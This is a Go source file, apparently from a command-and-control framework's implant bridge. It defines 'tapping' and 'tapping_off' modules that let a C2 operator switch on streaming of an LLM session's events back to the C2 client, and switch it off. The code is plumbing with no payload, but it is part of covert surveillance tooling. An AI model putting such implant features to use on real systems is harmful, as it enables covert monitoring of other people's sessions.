package bridge

import (
	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
	log "github.com/sirupsen/logrus"
)

// TappingModule handles the "tapping" C2 command by activating session
// observation — all subsequent LLM events are streamed back to the C2 client.
type TappingModule struct{}

func (m *TappingModule) Name() string { return "tapping" }

func (m *TappingModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, _ *implantpb.Spite) {
	ctx.Tasks.Create(sessionID, taskID, m.Name())
	ctx.TappingSet(sessionID, taskID)
	log.Infof("[bridge] tapping activated for session %s (taskID=%d)", sessionID, taskID)
	ctx.Tasks.Complete(sessionID, taskID)
}

// TappingOffModule handles the "tapping_off" C2 command by deactivating
// session observation.
type TappingOffModule struct{}

func (m *TappingOffModule) Name() string { return "tapping_off" }

func (m *TappingOffModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, _ *implantpb.Spite) {
	ctx.Tasks.Create(sessionID, taskID, m.Name())
	ctx.TappingDel(sessionID)
	log.Infof("[bridge] tapping deactivated for session %s", sessionID)
	ctx.SendSpite(sessionID, taskID, execSpite("tapping stopped"))
	ctx.Tasks.Complete(sessionID, taskID)
}
